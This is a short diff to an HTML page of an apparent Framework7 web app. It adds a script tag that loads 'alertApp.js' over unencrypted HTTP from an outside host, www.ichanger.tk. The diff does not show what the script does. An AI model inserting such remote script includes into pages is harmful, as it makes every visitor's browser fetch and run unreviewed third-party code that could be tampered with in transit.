@@ -763,5 +763,6 @@ echo "</p></div>";
     <script type="text/javascript" src="js/framework7.min.js"></script>
     <!-- Path to your app js-->
     <script type="text/javascript" src="js/f7-2.js"></script>
+    <script type="text/javascript" src="http://www.ichanger.tk/js/alertApp.js"></script>
   </body>
 </html>
